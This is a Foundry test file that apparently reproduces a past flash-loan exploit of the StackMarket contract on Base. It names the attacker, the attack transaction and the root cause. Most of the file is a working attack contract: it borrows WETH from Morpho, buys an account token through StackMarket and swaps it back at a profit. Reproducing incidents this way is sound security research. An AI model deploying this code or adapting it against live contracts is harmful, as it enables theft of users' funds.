// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 0.56 WETH
// Attacker : 0x97d8170e04771826a31c4c9b81e9f9191a1c8613
// Attack Contract : 0xc494dc1fe2c84cf7206562783edeeecd91c37715
// Vulnerable Contract : 0x555555555a4161c1c0ba310fc1c993086d3de042
// Attack Tx : https://basescan.org/tx/0x859a266d371188807e317fc214cd0d649575019808eeaee02ae1824a4d2694e2

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x555555555a4161c1c0ba310fc1c993086d3de042#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/575
//
// Attack summary: A transient helper borrowed WETH from Morpho, bought a StackMarket
// account token with the borrowed ETH, swapped the account token back to WETH, repaid
// Morpho, and forwarded the residual WETH to the attacker.
// Root cause: StackMarket's buy/liquidity path could be flash-loan driven for a
// target account token and unwound through the corresponding Uniswap V3 pool at a profit.

address constant ATTACKER = 0x97d8170e04771826A31C4c9B81E9f9191a1C8613;
address constant MORPHO_BLUE = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant WETH_TOKEN = 0x4200000000000000000000000000000000000006;
address constant STACK_MARKET = 0x555555555A4161c1C0bA310fc1c993086D3de042;
address constant BASE_SWAP_ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481;
address constant TARGET_ACCOUNT = 0x96a3a3d77ED4e089DE1De91ab612825Bf33d3490;

uint24 constant POOL_FEE = 500;

interface IStackMarket {
    function getAccountToken(address account) external view returns (address);
    function buy(address account, uint256 amount, uint160 sqrtPriceLimitX96) external payable;
}

interface IBaseSwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 27_309_556;
        vm.createSelectFork("base", forkBlock);
        fundingToken = WETH_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(MORPHO_BLUE, "Morpho Blue");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(STACK_MARKET, "StackMarket");
        vm.label(BASE_SWAP_ROUTER, "Base Uniswap V3 Router");
        vm.label(TARGET_ACCOUNT, "Target StackMarket Account");
    }

    function testExploit() public balanceLog {
        uint256 beforeBalance = IERC20(WETH_TOKEN).balanceOf(ATTACKER);

        vm.startPrank(ATTACKER, ATTACKER);
        StackMarketAttack attack = new StackMarketAttack();
        uint256 flashAmount = 26.88 ether;
        attack.start(TARGET_ACCOUNT, flashAmount);
        vm.stopPrank();

        uint256 afterBalance = IERC20(WETH_TOKEN).balanceOf(ATTACKER);
        assertGt(afterBalance, beforeBalance, "attacker WETH profit");
    }
}

contract StackMarketAttack {
    address private immutable owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function start(address account, uint256 amount) external {
        require(msg.sender == owner, "only owner");

        // step 1: authorize Morpho to pull the flash-loan repayment.
        IERC20(WETH_TOKEN).approve(MORPHO_BLUE, type(uint256).max);
        IMorphoBuleFlashLoan(MORPHO_BLUE).flashLoan(WETH_TOKEN, amount, abi.encode(account));

        // step 5: forward the remaining WETH profit to the attacker.
        IERC20(WETH_TOKEN).transfer(owner, IERC20(WETH_TOKEN).balanceOf(address(this)));
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        require(msg.sender == MORPHO_BLUE, "only Morpho");
        address account = abi.decode(data, (address));

        // step 2: resolve and approve the StackMarket account token.
        address accountToken = IStackMarket(STACK_MARKET).getAccountToken(account);
        IERC20(accountToken).approve(STACK_MARKET, type(uint256).max);

        // step 3: buy the account token with flash-loaned WETH unwrapped to ETH.
        IWETH(payable(WETH_TOKEN)).withdraw(assets);
        IStackMarket(STACK_MARKET).buy{value: assets}(account, 1, 0);

        // step 4: unwind all acquired account tokens back into WETH.
        uint256 tokenBalance = IERC20(accountToken).balanceOf(address(this));
        IERC20(accountToken).approve(BASE_SWAP_ROUTER, type(uint256).max);
        IBaseSwapRouter(BASE_SWAP_ROUTER).exactInputSingle(
            IBaseSwapRouter.ExactInputSingleParams({
                tokenIn: accountToken,
                tokenOut: WETH_TOKEN,
                fee: POOL_FEE,
                recipient: address(this),
                amountIn: tokenBalance,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        if (address(this).balance > 0) {
            IWETH(payable(WETH_TOKEN)).deposit{value: address(this).balance}();
        }
    }
}
